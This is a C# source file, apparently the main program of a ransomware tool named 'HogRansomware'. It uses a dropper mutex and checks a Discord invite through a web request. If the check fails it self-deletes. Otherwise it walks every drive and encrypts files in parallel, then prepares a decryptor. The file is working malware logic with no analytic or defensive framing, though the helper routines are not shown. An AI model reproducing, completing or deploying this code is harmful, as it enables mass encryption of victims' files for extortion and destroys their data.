using System.IO;
using System.Linq;
using System.Net;
using System.Threading;
using System.Threading.Tasks;

namespace HogRansomware;

internal class Program
{
	internal static string mt = "6950448537301897-Dropper-6950448537301897";

	private static void Main(string[] args)
	{
		using Mutex mutex = new Mutex(initiallyOwned: false, mt);
		if (!mutex.WaitOne(0, exitContext: false))
		{
			return;
		}
		try
		{
			Settings.Key = Utils.GenerateKey(43) + "=";
			Settings.DiscordInvite = Utils.ParseInvite(Settings.DiscordInvite);
			using WebClient webClient = new WebClient();
			string text = webClient.DownloadString("https://discord.com/api/v8/invites/" + Settings.DiscordInvite);
			Thread.Sleep(1000);
			if (!text.Contains("\", \"guild\": {") && Settings.Extension.Length <= 1)
			{
				Utils.Melt();
				return;
			}
			foreach (string item in from drive in DriveInfo.GetDrives()
				select drive.RootDirectory.FullName)
			{
				EncryptFiles(item);
			}
		}
		catch
		{
			Utils.Melt();
		}
	}

	private static void EncryptFiles(string path)
	{
		new Thread((ThreadStart)delegate
		{
			Utils.PrepareDecryptor();
		}).Start();
		Parallel.ForEach(Utils.GetFiles(path), new ParallelOptions
		{
			MaxDegreeOfParallelism = 100
		}, delegate(string file)
		{
			Utils.EncryptFile(file);
		});
		Utils.Melt();
	}
}
